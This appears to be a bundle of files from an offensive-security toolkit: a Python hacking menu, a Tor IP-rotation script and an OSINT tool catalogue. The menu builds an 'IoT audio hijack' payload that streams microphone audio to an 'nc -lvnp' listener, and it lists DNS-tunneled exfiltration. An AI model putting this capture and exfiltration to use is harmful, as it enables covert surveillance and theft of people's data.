    script_path = "/tmp/godseye_iot_hijack.sh"
    with open(script_path, "w") as f:
        f.write(script)
    os.chmod(script_path, 0o755)

    print(f"  {CYAN}[*] Payload ready: {script_path}{RESET}")
    print(f"  {CYAN}[*] On your listener, run: nc -lvnp {port} > captured_audio.raw{RESET}\n")

    ans = input(f"  {BOLD}Run payload now? [y/N]: {RESET}").strip().lower()
    if ans == "y":
        open_in_terminal("IoT Audio Hijack", script_path, wait=False)

    pause()


def audio_surveillance_menu():
    options = {
        "1": ("ffmpeg", "Capture / stream audio"),
        "2": ("sox", "Lightweight audio capture"),
        "3": ("dnscat2", "DNS-tunneled data exfiltration"),
        "4": ("steghide", "Hide audio inside images / audio files"),
    }
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ Audio Surveillance — IoT Listening Post ]{RESET}\n")
        for k, (name, desc) in options.items():
            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
        print(f"\n  {GREEN}[P]{RESET} Run IoT Audio Hijack PoC (ADB mic capture)")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c in options:
            launch_tool(options[c][0])
        elif c.lower() == "p":
            run_iot_audio_payload()
        elif c == "0":
            break


# ─────────────────────────────────────────────────────────
# Integrations  — UNCHANGED
# ─────────────────────────────────────────────────────────

def integrations_menu():
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ Integrations & External Tools ]{RESET}\n")
        print(f"  {GREEN}[1]{RESET} Aegis Cyber Gateway     {CYAN}->{RESET} Open Aegis portfolio in browser")
        print(f"  {GREEN}[2]{RESET} OSINT Framework          {CYAN}->{RESET} Open osintframework.com")
        print(f"  {GREEN}[3]{RESET} Shannon AI (LLM)         {CYAN}->{RESET} Clone & run Keygraph Shannon")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c == "1":
            open_url("https://aegiscybercomms.netlify.app/", "Aegis Cyber Gateway")
        elif c == "2":
            open_url("https://osintframework.com/", "OSINT Framework")
        elif c == "3":
            clone_and_run(
                "Shannon AI",
                "https://github.com/KeygraphHQ/shannon.git",
                "python3 shannon.py 2>/dev/null || python3 main.py 2>/dev/null || bash",
            )
        elif c == "0":
            break


# ─────────────────────────────────────────────────────────
# About  — UNCHANGED
# ─────────────────────────────────────────────────────────

def about():
    clear_screen()
    header()
    print(f"""  {CYAN}{"-" * 56}
  [!] PROJECT GOD'S EYE - CREDENTIALS REPORT
  {"-" * 56}{RESET}

  {BOLD}Architect{RESET}
  Vaishnav Rajeev - B.Tech Cyber Security
  Specialisation: OSINT, digital forensics, network security,Cyber espionage,Reconnaisance and Enumeration, Social Engineering,IoT and Embedded device security 
  scripting and automation,

  {BOLD}Core Contributors{RESET}
  Rishabh Gurnani - B.Tech Cyber Security
  Specialisation: Governance, risk & compliance (GRC),
  identity and multi-factor authentication

  {CYAN}{"-" * 56}
  Mission
  {"-" * 56}{RESET}
  God's Eye consolidates industry-standard reconnaissance
  and OSINT tools into a single, accessible framework for
  ethical hackers, security researchers, and defenders.

  All activities must be performed on systems you own or
  have explicit written authorisation to test.

  {CYAN}{"-" * 56}{RESET}
  {MAGENTA}Contact: vaishnav.cvv240888@cvv.ac.in{RESET}
  {CYAN}{"-" * 56}{RESET}
""")
    pause()


# ─────────────────────────────────────────────────────────
# Main menu  — UPDATED with new categories
# ─────────────────────────────────────────────────────────

def main_menu():
    while True:
        clear_screen()
        header()

        if not check_internet():
            print(f"  {RED}[!] No internet connection detected.{RESET}\n")

        print(f"  {YELLOW}[ Reconnaissance ]{RESET}")
        print(f"  {GREEN}[1]{RESET} Host OSINT        {GREEN}[2]{RESET} DNS Recon")
        print(f"  {GREEN}[3]{RESET} Web Scan          {GREEN}[4]{RESET} Web Vuln")
        print(f"  {GREEN}[5]{RESET} Wireless Audit")

        print(f"\n  {YELLOW}[ Exploitation / Post-Exploit ]{RESET}")
        print(f"  {GREEN}[6]{RESET} Exploitation      {GREEN}[7]{RESET} Post-Exploit & Pivot")
        print(f"  {GREEN}[8]{RESET} Phishing / Social Eng")

        print(f"\n  {YELLOW}[ IoT / Audio ]{RESET}")
        print(f"  {GREEN}[9]{RESET} IoT & Hardware     {GREEN}[10]{RESET} Audio Surveillance")

        print(f"\n  {YELLOW}[ Anonymity ]{RESET}")
        print(f"  {GREEN}[11]{RESET} MAC Changer       {GREEN}[12]{RESET} IP Changer")
        print(f"  {GREEN}[13]{RESET} GOD'S FIX")

        print(f"\n  {YELLOW}[ Integrations ]{RESET}")
        print(f"  {GREEN}[14]{RESET} External Tools & Integrations")

        print(f"\n  {YELLOW}[ Info ]{RESET}")
        print(f"  {GREEN}[15]{RESET} About / Authors")
        print(f"\n  {RED}[0]{RESET} Exit\n")

        c = input(f"  {BOLD}Vector: {RESET}").strip()

        routes = {
            "1": host_menu,
            "2": network_menu,
            "3": web_scan_menu,
            "4": web_vuln_menu,
            "5": wireless_menu,
            "6": exploitation_menu,
            "7": post_exploit_menu,
            "8": phishing_menu,
            "9": iot_menu,
            "10": audio_surveillance_menu,
            "11": mac_changer,
            "12": ip_changer,
            "13": gods_fix,
            "14": integrations_menu,
            "15": about,
        }

        if c in routes:
            routes[c]()
        elif c == "0":
            print(f"\n  {CYAN}[*] Session closed. Stay ethical.{RESET}\n")
            sys.exit(0)


# ─────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n\n  {YELLOW}[!] Interrupted. Exiting cleanly.{RESET}\n")
        sys.exit(0)#!/bin/bash
# -------------------------------
# 🔁 IPHopper - IP Changing Tool
# Created by Alok Thakur
# YouTube: Firewall Breaker
# -------------------------------

clear
echo -e "\e[31m██╗██████╗       ██╗  ██╗ ██████╗ ██████╗ ██████╗ ██████╗ ██████╗"
echo -e "██║██╔══██╗      ██║  ██║██╔═══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗"
echo -e "██║██████╔╝█████╗███████║██║   ██║██████╔╝██████╔╝██████╔╝██████╔╝"
echo -e "██║██╔═══╝ ╚════╝██╔══██║██║   ██║██╔═══╝ ██╔═══╝ ██╔══██╗██╔══██╗"
echo -e "██║██║           ██║  ██║╚██████╔╝██║     ██║     ██║  ██║██║  ██║"
echo -e "╚═╝╚═╝           ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝\e[0m"
echo -e "\e[1;33m               🔁 IPHopper - IP Changing Tool 🔁\e[0m"
echo -e "\e[1;34m         👨‍💻 Created by Alok Thakur | YouTube: Firewall Breaker\e[0m"
echo ""

# Kill old services and cleanup
pkill tor
pkill privoxy
rm -rf ~/.tor_multi ~/.privoxy
mkdir -p ~/.tor_multi ~/.privoxy

# Launch multiple TOR instances
echo -e "\e[1;32m[+] Launching Tor Nodes & Proxy Server...\e[0m"

PORTS=(9050 9060 9070 9080 9090)
CONTROL_PORTS=(9051 9061 9071 9081 9091)

for i in {0..4}; do
    TOR_DIR="$HOME/.tor_multi/tor$i"
    mkdir -p "$TOR_DIR"
    cat <<EOF > "$TOR_DIR/torrc"
SocksPort ${PORTS[$i]}
ControlPort ${CONTROL_PORTS[$i]}
DataDirectory $TOR_DIR
CookieAuthentication 0
EOF
    tor -f "$TOR_DIR/torrc" > /dev/null 2>&1 &
    sleep 2
done

# Setup Privoxy with TOR SOCKS ports
cat <<EOF > "$HOME/.privoxy/config"
listen-address 127.0.0.1:8118
EOF
for port in "${PORTS[@]}"; do
    echo "forward-socks5 / 127.0.0.1:$port ." >> "$HOME/.privoxy/config"
done

privoxy "$HOME/.privoxy/config" > /dev/null 2>&1 &

# Ask user for IP rotation interval
echo -ne "\e[1;36mEnter IP rotation interval (in seconds, min 5s): \e[0m"
read -r ROTATION_TIME

if [[ ! "$ROTATION_TIME" =~ ^[0-9]+$ ]] || [[ "$ROTATION_TIME" -lt 5 ]]; then
    echo -e "\e[1;31mInvalid input! Using default 10 seconds.\e[0m"
    ROTATION_TIME=10
fi

# Infinite IP rotation loop
while true; do
    for ctrl_port in "${CONTROL_PORTS[@]}"; do
        echo -e "AUTHENTICATE \"\"\r\nSIGNAL NEWNYM\r\nQUIT" | nc 127.0.0.1 $ctrl_port > /dev/null 2>&1
    done
    NEW_IP=$(curl --proxy http://127.0.0.1:8118 -s https://api64.ipify.org)
    echo -e "\e[1;32m🌐 New IP: $NEW_IP ✅\e[0m"
    echo -e "\e[1;34m[Proxy]: 127.0.0.1:8118 🛰️\e[0m"
    sleep "$ROTATION_TIME"
done#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                          O S I N T   F R A M E W O R K                       ║
║                                                                              ║
║  LEGEND                                                                      ║
║   (T) Tool must be installed locally                                         ║
║   (D) Google Dork                                                            ║
║   (R) Requires registration                                                  ║
║   (M) Manual URL editing required                                            ║
╚══════════════════════════════════════════════════════════════════════════════╝

Usage:
    python3 osint_framework.py              → interactive menu
    python3 osint_framework.py --query "domain names"
    python3 osint_framework.py --export json
    python3 osint_framework.py --export csv
    python3 osint_framework.py --list-categories
"""


import os
import sys
import json
import csv
import textwrap
import argparse
import webbrowser

# ─────────────────────────────────────────────────────────────────────────────
# COLOUR HELPERS  (gracefully degrade on Windows without colour support)
# ─────────────────────────────────────────────────────────────────────────────
def _c(code: str, text: str) -> str:
    """Wrap text in an ANSI escape code if stdout is a tty."""
    if sys.stdout.isatty():
        return f"\033[{code}m{text}\033[0m"
    return text

RED    = lambda t: _c("31;1", t)
GREEN  = lambda t: _c("32;1", t)
YELLOW = lambda t: _c("33;1", t)
CYAN   = lambda t: _c("36;1", t)
BLUE   = lambda t: _c("34;1", t)
BOLD   = lambda t: _c("1",    t)
DIM    = lambda t: _c("2",    t)
MAGENTA = lambda t: _c("35;1", t)

# ─────────────────────────────────────────────────────────────────────────────
# THE FRAMEWORK DATA
# Each category is a dict:
#   { "desc": str, "subcategories": {...} | None, "tools": [...] }
# Each tool entry:
#   { "name": str, "url": str, "flags": list[str],
#     "purpose": str, "usage": str, "notes": str }
# flags ∈ {"T","D","R","M"}
# ─────────────────────────────────────────────────────────────────────────────

FRAMEWORK: dict = {
    "Usernames": {
        "desc": "Search for usernames across social networks and sites.",
        "tools": [],
        "subcategories": {
            "Username Search Engines": {
                "desc": "Multi-site username lookup tools.",
                "tools": [
                    {"name": "Sherlock (T)", "url": "https://github.com/sherlock-project/sherlock",
                     "flags": ["T"],
                     "purpose": "Hunt usernames across 400+ social networks from the command line.",
                     "usage": "pip install sherlock-project\nsherlock <username>",
                     "notes": "Requires Python 3.6+. One of the most comprehensive username tools available."},
                    {"name": "Maigret (T)", "url": "https://github.com/soxoj/maigret",
                     "flags": ["T"],
                     "purpose": "Collect a dossier on a person by username; checks 3000+ sites.",
                     "usage": "pip install maigret\nmaigret <username>",
                     "notes": "Actively maintained fork/successor to Sherlock with more sites."},
                    {"name": "WhatsMyName", "url": "https://whatsmyname.app",
                     "flags": [],
                     "purpose": "Enumerate usernames across many websites via a simple web UI.",
                     "usage": "Visit site → enter username → review results.",
                     "notes": "Also available as a CLI tool on GitHub (webbreacher/WhatsMyName)."},
                    {"name": "Namechk", "url": "https://namechk.com",
                     "flags": [],
                     "purpose": "Check username/domain availability across social networks & domains.",
                     "usage": "Enter desired username → see availability heat-map.",
                     "notes": "Useful for brand monitoring and squatting detection."},
                    {"name": "UserSearch.org", "url": "https://usersearch.org",
                     "flags": [],
                     "purpose": "Search for a username across 2000+ websites.",
                     "usage": "Enter username → browse categorised results.",
                     "notes": "Web-based; no account required."},
                    {"name": "KnowEm", "url": "https://knowem.com",
                     "flags": [],
                     "purpose": "Check username across 500+ social networks.",
                     "usage": "Enter username → get full availability report.",
                     "notes": "Handy for brand/trademark OSINT."},
                    {"name": "Namecheckr", "url": "https://www.namecheckr.com",
                     "flags": [],
                     "purpose": "Check social media username availability across platforms.",
                     "usage": "Enter username → get colour-coded results.",
                     "notes": "Fast, free, no login needed."},
                    {"name": "Instant Username Search", "url": "https://instantusername.com",
                     "flags": [],
                     "purpose": "Real-time username availability check across platforms.",
                     "usage": "Type username → results appear instantly.",
                     "notes": "Good for rapid checks; less comprehensive than Sherlock."},
                ],
                "subcategories": {}
            },
            "Specific Sites": {
                "desc": "Look up profiles on individual social platforms.",
                "tools": [
                    {"name": "GitHub Profile (M)", "url": "https://github.com/<username>",
                     "flags": ["M"],
                     "purpose": "Direct URL to a GitHub profile.",
                     "usage": "Replace <username> in URL.",
                     "notes": "Check repos, gists, stars, contributions."},
                    {"name": "Twitter/X Profile (M)", "url": "https://twitter.com/<username>",
                     "flags": ["M"],
                     "purpose": "Direct URL to a Twitter/X profile.",
                     "usage": "Replace <username> in URL.",
                     "notes": "Check tweets, follows, media."},
                    {"name": "Reddit User (M)", "url": "https://www.reddit.com/user/<username>",
                     "flags": ["M"],
                     "purpose": "View all posts and comments by a Reddit user.",
                     "usage": "Replace <username> in URL.",
                     "notes": "Reddit public API also returns full history."},
                    {"name": "Instagram (M)", "url": "https://www.instagram.com/<username>",
                     "flags": ["M"],
                     "purpose": "View a public Instagram profile.",
                     "usage": "Replace <username> in URL.",
                     "notes": "Private accounts require a follow request."},
                ],
                "subcategories": {}
            }
        }
    },
    "Email Addresses": {
        "desc": "Tools to investigate, validate, and enumerate email addresses.",
        "tools": [],
        "subcategories": {
            "Email Verification": {
                "desc": "Verify whether an email address is valid/live.",
                "tools": [
                    {"name": "Hunter.io (R)", "url": "https://hunter.io",
                     "flags": ["R"],
                     "purpose": "Find and verify professional email addresses by domain.",
                     "usage": "Enter domain → get list of emails + confidence score.",
                     "notes": "Free tier: 25 searches/month. Also has API."},
                    {"name": "EmailHippo", "url": "https://tools.emailhippo.com",
                     "flags": [],
                     "purpose": "Verify if an email address exists and is deliverable.",
                     "usage": "Enter email → get status (valid / invalid / unknown).",
                     "notes": "Does not send an actual email; uses SMTP probing."},
                    {"name": "Verify Email Address", "url": "https://verify-email.org",
                     "flags": [],
                     "purpose": "Checks MX records and SMTP to validate email delivery.",
                     "usage": "Enter email → check result.",
                     "notes": "Free, simple, no registration."},
                    {"name": "MailTester", "url": "https://www.mailtester.com",
                     "flags": [],
                     "purpose": "Validate email syntax and MX record existence.",
                     "usage": "Enter email → get validation result.",
                     "notes": "Lightweight; does not do SMTP connection."},
                ],
                "subcategories": {}
            },
            "Breach / Paste Search": {
                "desc": "Check if an email appeared in known data breaches.",
                "tools": [
                    {"name": "Have I Been Pwned", "url": "https://haveibeenpwned.com",
                     "flags": [],
                     "purpose": "Check if an email appeared in publicly known data breaches.",
                     "usage": "Enter email → see breach list with dates and data types exposed.",
                     "notes": "Run by Troy Hunt. Very reliable and comprehensive."},
                    {"name": "DeHashed (R)", "url": "https://dehashed.com",
                     "flags": ["R"],
                     "purpose": "Search leaked credentials (email, username, password, IP).",
                     "usage": "Log in → search by email / domain / IP.",
                     "notes": "Paid after free trial. Very large breach database."},
                    {"name": "Leak-Lookup (R)", "url": "https://leak-lookup.com",
                     "flags": ["R"],
                     "purpose": "Check emails/usernames against known breach datasets.",
                     "usage": "Enter email or username → see matched datasets.",
                     "notes": "Freemium; limited free queries."},
                    {"name": "IntelX", "url": "https://intelx.io",
                     "flags": ["R"],
                     "purpose": "Search engine for leaked data, dark web, pastes, emails.",
                     "usage": "Enter email → see results across pastes and breaches.",
                     "notes": "Free tier available; advanced features require subscription."},
                    {"name": "Snusbase (R)", "url": "https://snusbase.com",
                     "flags": ["R"],
                     "purpose": "Search through data breaches by email, username, IP, hash.",
                     "usage": "Enter search term → get matched breach data.",
                     "notes": "Subscription-based."},
                ],
                "subcategories": {}
            },
            "Email Header Analysis": {
                "desc": "Analyse raw email headers for routing and metadata.",
                "tools": [
                    {"name": "MXToolbox Email Headers", "url": "https://mxtoolbox.com/EmailHeaders.aspx",
                     "flags": [],
                     "purpose": "Parse and visualise email headers to trace routing path.",
                     "usage": "Paste raw email header → get timeline and hop analysis.",
                     "notes": "Also shows SPF/DKIM/DMARC alignment."},
                    {"name": "Google Admin Toolbox", "url": "https://toolbox.googleapps.com/apps/messageheader/",
                     "flags": [],
                     "purpose": "Analyse Gmail/Google Workspace email headers.",
                     "usage": "Paste header → see message routing delays.",
                     "notes": "Official Google tool; great for GSuite environments."},
                ],
                "subcategories": {}
            }
        }
    },
    "Domain Names": {
        "desc": "Tools to investigate domain ownership, history, DNS, and infrastructure.",
        "tools": [],
        "subcategories": {
            "WHOIS": {
                "desc": "Domain registration and ownership lookups.",
                "tools": [
                    {"name": "WHOIS Lookup", "url": "https://www.whois.com/whois/",
                     "flags": [],
                     "purpose": "Query WHOIS database for domain registration details.",
                     "usage": "Enter domain → see registrant, dates, nameservers.",
                     "notes": "GDPR redaction applies to many .com/.net domains."},
                    {"name": "DomainTools (R)", "url": "https://www.domaintools.com",
                     "flags": ["R"],
                     "purpose": "Advanced WHOIS, DNS, and domain history research.",
                     "usage": "Enter domain → get current + historical WHOIS, hosting history.",
                     "notes": "Industry-leading; paid subscription for full data."},
                    {"name": "ViewDNS.info", "url": "https://viewdns.info",
                     "flags": [],
                     "purpose": "Collection of DNS/IP lookup tools in one place.",
                     "usage": "Choose tool (Reverse IP, WHOIS, DNS report, etc.) → enter target.",
                     "notes": "Free; no registration required. Very useful collection."},
                    {"name": "Who.is", "url": "https://who.is",
                     "flags": [],
                     "purpose": "Simple WHOIS lookup with clean interface.",
                     "usage": "Enter domain → view registration info.",
                     "notes": "Good fallback when other tools are gated."},
                    {"name": "Whoxy (R)", "url": "https://www.whoxy.com",
                     "flags": ["R"],
                     "purpose": "Reverse WHOIS: find all domains registered by an email or name.",
                     "usage": "Enter email/name/phone → get domain list.",
                     "notes": "Freemium; paid for bulk reverse WHOIS."},
                ],
                "subcategories": {}
            },
            "DNS Records": {
                "desc": "Query and analyse DNS records.",
                "tools": [
                    {"name": "MXToolbox", "url": "https://mxtoolbox.com",
                     "flags": [],
                     "purpose": "DNS lookup, MX records, blacklist check, SMTP diagnostics.",
                     "usage": "Enter domain → choose record type (MX, A, AAAA, TXT, etc.).",
                     "notes": "Go-to for email infrastructure OSINT."},
                    {"name": "DNSdumpster", "url": "https://dnsdumpster.com",
                     "flags": [],
                     "purpose": "Passive DNS recon — discover subdomains and DNS records.",
                     "usage": "Enter domain → get DNS map with graph visualisation.",
                     "notes": "Free; does not actively scan target. Great for passive recon."},
                    {"name": "SecurityTrails (R)", "url": "https://securitytrails.com",
                     "flags": ["R"],
                     "purpose": "Historical DNS and WHOIS data for domain intelligence.",
                     "usage": "Search domain → view current/historical A, MX, NS records.",
                     "notes": "Free account gives limited history; paid for full depth."},
                    {"name": "Shodan (R)", "url": "https://www.shodan.io",
                     "flags": ["R"],
                     "purpose": "Search engine for internet-connected devices; find open ports/services.",
                     "usage": "Search domain or IP → see exposed services, ports, banners.",
                     "notes": "Freemium. Extremely powerful for infrastructure OSINT."},
                    {"name": "Censys (R)", "url": "https://censys.io",
                     "flags": ["R"],
                     "purpose": "Internet-wide scanning data: certificates, hosts, ports.",
                     "usage": "Search domain or IP → see TLS certs, open ports.",
                     "notes": "Free researcher accounts available."},
                    {"name": "Robtex", "url": "https://www.robtex.com",
                     "flags": [],
                     "purpose": "DNS and network intelligence with graph relationships.",
                     "usage": "Enter domain or IP → see linked domains, ASN, routing.",
                     "notes": "Great for visualising infrastructure connections."},
                ],
                "subcategories": {}
            },
            "Subdomains": {
                "desc": "Discover subdomains of a target domain.",
                "tools": [
                    {"name": "Sublist3r (T)", "url": "https://github.com/aboul3la/Sublist3r",
                     "flags": ["T"],
                     "purpose": "Fast passive subdomain enumeration using multiple sources.",
                     "usage": "pip install sublist3r\npython sublist3r.py -d example.com",
                     "notes": "Uses Google, Bing, Virustotal, Netcraft, Shodan, etc."},
                    {"name": "crt.sh", "url": "https://crt.sh",
                     "flags": [],
                     "purpose": "Search Certificate Transparency logs to find subdomains.",
                     "usage": "Enter %.domain.com → get all subdomains in SSL certs.",
                     "notes": "100% passive. Gold standard for cert-based subdomain discovery."},
                    {"name": "Amass (T)", "url": "https://github.com/owasp-amass/amass",
                     "flags": ["T"],
                     "purpose": "In-depth attack surface mapping and subdomain enumeration.",
                     "usage": "go install github.com/owasp-amass/amass/v4/...\namass enum -d example.com",
                     "notes": "OWASP project. Most comprehensive open-source subdomain tool."},
                    {"name": "Pentest-Tools Subdomain Finder (R)", "url": "https://pentest-tools.com/information-gathering/find-subdomains-of-domain",
                     "flags": ["R"],
                     "purpose": "Web-based subdomain scanner.",
                     "usage": "Enter domain → receive subdomain list.",
                     "notes": "Limited free scans; paid for full results."},
                ],
                "subcategories": {}
            },
            "Domain History": {
                "desc": "View archived or historical domain states.",
                "tools": [
                    {"name": "Wayback Machine", "url": "https://web.archive.org",
                     "flags": [],
                     "purpose": "View archived snapshots of websites over time.",
                     "usage": "Enter URL → navigate calendar to choose snapshot date.",
                     "notes": "Invaluable for investigating deleted/changed content."},
                    {"name": "Archive.ph", "url": "https://archive.ph",
                     "flags": [],
                     "purpose": "Create and retrieve saved snapshots of web pages.",
                     "usage": "Enter URL → get permanent snapshot link.",
                     "notes": "Great for preserving evidence before it disappears."},
                    {"name": "DomainHistory (M)", "url": "https://www.domainhistory.net",
                     "flags": ["M"],
                     "purpose": "View historical WHOIS records and DNS changes.",
                     "usage": "Enter domain → browse registration timeline.",
                     "notes": "Shows ownership changes over years."},
                ],
                "subcategories": {}
            }
        }
    },
    "IP Addresses": {
        "desc": "Investigate IP addresses — geolocation, ownership, reputation.",
        "tools": [],
        "subcategories": {
            "Geolocation": {
                "desc": "Map an IP address to a geographic location.",
                "tools": [
                    {"name": "ipinfo.io (M)", "url": "https://ipinfo.io/<ip>",
                     "flags": ["M"],
                     "purpose": "IP geolocation, ASN, hostname, and carrier info.",
                     "usage": "Replace <ip> in URL or use API: curl ipinfo.io/<ip>",
                     "notes": "Very accurate; free tier 50k requests/month."},
                    {"name": "MaxMind GeoIP", "url": "https://www.maxmind.com/en/geoip-demo",
                     "flags": [],
                     "purpose": "Industry-standard IP geolocation database demo.",
                     "usage": "Enter IP → see city, region, country, ASN.",
                     "notes": "Used by most security tools under the hood."},
                    {"name": "IP-API", "url": "http://ip-api.com",
                     "flags": [],
                     "purpose": "Free JSON IP geolocation API.",
                     "usage": "curl http://ip-api.com/json/<ip>",
                     "notes": "45 requests/min free; no key needed."},
                    {"name": "WhatIsMyIPAddress", "url": "https://whatismyipaddress.com",
                     "flags": [],
                     "purpose": "Lookup an IP with geolocation and reverse DNS.",
                     "usage": "Enter IP in search bar.",
                     "notes": "Good fallback for quick manual lookups."},
                ],
                "subcategories": {}
            },
            "Reputation / Blacklist": {
                "desc": "Check if an IP is malicious or blacklisted.",
                "tools": [
                    {"name": "VirusTotal", "url": "https://www.virustotal.com",
                     "flags": [],
                     "purpose": "Scan IP/domain/file against 70+ antivirus and reputation engines.",
                     "usage": "Paste IP or URL → see detections and community reports.",
                     "notes": "Free; also has an API for automation."},
                    {"name": "AbuseIPDB (R)", "url": "https://www.abuseipdb.com",
                     "flags": ["R"],
                     "purpose": "Community database of IPs reported for malicious activity.",
                     "usage": "Enter IP → see abuse confidence score and report history.",
                     "notes": "Free account gives API access (1000 checks/day)."},
                    {"name": "Talos Intelligence", "url": "https://talosintelligence.com/reputation_center",
                     "flags": [],
                     "purpose": "Cisco Talos IP and domain reputation lookup.",
                     "usage": "Enter IP/domain → see reputation score and category.",
                     "notes": "Backed by Cisco's global threat telemetry."},
                    {"name": "MXToolbox Blacklist Check", "url": "https://mxtoolbox.com/blacklists.aspx",
                     "flags": [],
                     "purpose": "Check if an IP is on any major email blacklist (DNSBL).",
                     "usage": "Enter IP → check against 100+ blacklists at once.",
                     "notes": "Critical for email infrastructure investigations."},
                    {"name": "Shodan (R)", "url": "https://www.shodan.io",
                     "flags": ["R"],
                     "purpose": "Find open ports and services on an IP address.",
                     "usage": "Search <ip> → see exposed banners, ports, vulns.",
                     "notes": "The definitive tool for IP/device fingerprinting."},
                ],
                "subcategories": {}
            },
            "BGP / ASN": {
                "desc": "Autonomous System Number and routing intelligence.",
                "tools": [
                    {"name": "BGP.he.net", "url": "https://bgp.he.net",
                     "flags": [],
                     "purpose": "BGP routing, ASN info, prefix ownership, peering.",
                     "usage": "Enter IP/ASN/domain → see routing relationships.",
                     "notes": "Hurricane Electric's BGP toolkit. Industry standard."},
                    {"name": "RIPEstat", "url": "https://stat.ripe.net",
                     "flags": [],
                     "purpose": "RIPE NCC data for IP routing, prefix, and ASN analysis.",
                     "usage": "Enter IP or prefix → see routing history and allocation.",
                     "notes": "Authoritative for RIPE region (Europe/Middle East)."},
                    {"name": "ARIN Whois (M)", "url": "https://search.arin.net/rdap/",
                     "flags": ["M"],
                     "purpose": "IP address registration lookup for North America (ARIN).",
                     "usage": "Enter IP → get allocation and organisation info.",
                     "notes": "Use for IPs in the ARIN region."},
                ],
                "subcategories": {}
            }
        }
    },
    "Social Networks": {
        "desc": "OSINT tools for major social media platforms.",
        "tools": [],
        "subcategories": {
            "Twitter / X": {
                "desc": "Search and analyse Twitter/X content and accounts.",
                "tools": [
                    {"name": "Twitter Advanced Search (M)", "url": "https://twitter.com/search-advanced",
                     "flags": ["M"],
                     "purpose": "Advanced query filtering: by user, date, location, words.",
                     "usage": "Use operators: from:user, since:date, near:city, etc.",
                     "notes": "Free; very powerful for targeted tweet discovery."},
                    {"name": "TweetDeck", "url": "https://tweetdeck.twitter.com",
                     "flags": ["R"],
                     "purpose": "Multi-column Twitter dashboard for monitoring accounts/hashtags.",
                     "usage": "Add columns for lists, searches, accounts.",
                     "notes": "Now requires Twitter Blue subscription."},
                    {"name": "Twitonomy (R)", "url": "https://www.twitonomy.com",
                     "flags": ["R"],
                     "purpose": "Twitter analytics: tweet patterns, mentions, hashtags, followers.",
                     "usage": "Log in with Twitter → analyse any public account.",
                     "notes": "Free account gives basic stats."},
                    {"name": "Social Bearing", "url": "https://socialbearing.com",
                     "flags": [],
                     "purpose": "Twitter analytics and search with geographic mapping.",
                     "usage": "Search by keyword, hashtag, or username.",
                     "notes": "Good for event-based monitoring."},
                ],
                "subcategories": {}
            },
            "Facebook": {
                "desc": "Search and investigate Facebook content.",
                "tools": [
                    {"name": "Facebook Search (D)", "url": "https://www.google.com/search?q=site:facebook.com",
                     "flags": ["D"],
                     "purpose": "Use Google to search within Facebook's public pages.",
                     "usage": 'Google dork: site:facebook.com "<target name>"',
                     "notes": "Workaround for Facebook's limited public search."},
                    {"name": "Lookup-ID.com", "url": "https://lookup-id.com",
                     "flags": [],
                     "purpose": "Find the numeric Facebook ID behind a profile URL.",
                     "usage": "Paste Facebook profile URL → get numeric ID.",
                     "notes": "Useful for tracking renamed/vanity URL profiles."},
                    {"name": "IntelTechniques Facebook", "url": "https://inteltechniques.com/tools/Facebook.html",
                     "flags": [],
                     "purpose": "Curated collection of Facebook OSINT search tools.",
                     "usage": "Select search type → enter query → execute.",
                     "notes": "By Michael Bazzell — excellent for structured FB investigation."},
                ],
                "subcategories": {}
            },
            "LinkedIn": {
                "desc": "Professional network intelligence.",
                "tools": [
                    {"name": "LinkedIn People Search (D)", "url": "https://www.google.com/search?q=site:linkedin.com/in/",
                     "flags": ["D"],
                     "purpose": "Use Google to search LinkedIn profiles without logging in.",
                     "usage": 'site:linkedin.com/in/ "<name>" "<company>"',
                     "notes": "Bypasses LinkedIn's paywall for viewing profiles."},
                    {"name": "Recruitin.net", "url": "https://recruitin.net",
                     "flags": [],
                     "purpose": "Build Google X-ray search queries for LinkedIn profiles.",
                     "usage": "Enter job title/skills/location → copy generated query.",
                     "notes": "Great for finding LinkedIn profiles without a paid subscription."},
                    {"name": "ContactOut (R)", "url": "https://contactout.com",
                     "flags": ["R"],
                     "purpose": "Find emails and phone numbers from LinkedIn profiles.",
                     "usage": "Install extension → browse LinkedIn → see contact data.",
                     "notes": "Freemium; limited free credits."},
                ],
                "subcategories": {}
            },
            "Instagram": {
                "desc": "Instagram profile and content OSINT.",
                "tools": [
                    {"name": "Instalooter (T)", "url": "https://github.com/althonos/instalooter",
                     "flags": ["T"],
                     "purpose": "Download all media from an Instagram account (public).",
                     "usage": "pip install instalooter\ninstalooter user <username> ./output",
                     "notes": "Works on public profiles; no API key needed."},
                    {"name": "Imginn", "url": "https://imginn.com",
                     "flags": [],
                     "purpose": "View and download Instagram posts/stories without an account.",
                     "usage": "Enter Instagram username → browse content.",
                     "notes": "Public profiles only."},
                    {"name": "Picuki", "url": "https://www.picuki.com",
                     "flags": [],
                     "purpose": "Browse and download Instagram profile content anonymously.",
                     "usage": "Enter username in search → view posts, reels, stories.",
                     "notes": "No account required."},
                ],
                "subcategories": {}
            },
            "Reddit": {
                "desc": "Search and analyse Reddit users and content.",
                "tools": [
                    {"name": "Pushshift.io (R)", "url": "https://pushshift.io",
                     "flags": ["R"],
                     "purpose": "Historical Reddit data: search deleted posts and comments.",
                     "usage": "Use API: https://api.pushshift.io/reddit/search/comment/?author=<user>",
                     "notes": "Access now restricted; check current API availability."},
                    {"name": "Reddit User Analyser", "url": "https://redditmetis.com",
                     "flags": [],
                     "purpose": "Analyse posting patterns, sentiment, and activity of a Reddit user.",
                     "usage": "Enter username → view subreddit breakdown and timeline.",
                     "notes": "Useful for behavioural profiling."},
                    {"name": "Subreddit Stats", "url": "https://subredditstats.com",
                     "flags": [],
                     "purpose": "Statistics and trends for subreddits.",
                     "usage": "Enter subreddit name → see growth and activity graphs.",
                     "notes": "Good for community-level OSINT."},
                ],
                "subcategories": {}
            }
        }
    },
    "People Search": {
        "desc": "Search engines and aggregators that compile personal data.",
